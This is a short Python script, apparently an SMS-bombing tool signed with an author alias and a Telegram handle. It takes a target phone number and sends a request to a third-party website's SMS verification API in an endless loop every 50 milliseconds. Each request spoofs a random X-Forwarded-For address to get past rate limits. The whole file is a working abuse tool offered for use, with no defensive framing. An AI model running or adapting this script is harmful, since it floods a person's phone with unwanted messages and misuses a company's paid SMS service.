import random
import requests
import time
import socket
import struct
import argparse

name = " Devils"
telegram_username = "@Alwayshiddens"

print(f"Name: {name}")
print(f"Telegram Username: {telegram_username}")


def milliseconds():
    mt = str(time.time()).split('.')
    return int(mt[0]) * 1000 + int(mt[1]) // 1000

def http_call(url, data):
    loc = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    i = milliseconds()
    headers = {
        'X-Forwarded-For': loc,
        'Host': 'www.anpolync.com',
        'sign': '33047247A2026017AA9EE9BF47C144A8',
        'timestamp': str(i),
        'content-type': 'application/json;charset=UTF-8'
    }
    response = requests.post(url, headers=headers, data=data, verify=True)  
    output = response.text
    return output

parser = argparse.ArgumentParser()
parser.add_argument('-n', '--number', type=str, help='Phone number')
args = parser.parse_args()

if not args.number:
    parser.error('Please provide a phone number using -n or --number argument')

url1 = "https://www.anpolync.com/api/index/SendSms"

number = args.number
otp = '1234'  

data1 = '{"country": 91, "mobile": "' + number + '", "code": "' + otp + '"}'

while True:
    output1 = http_call(url1, data1)
    print(output1)
    time.sleep(0.05) 
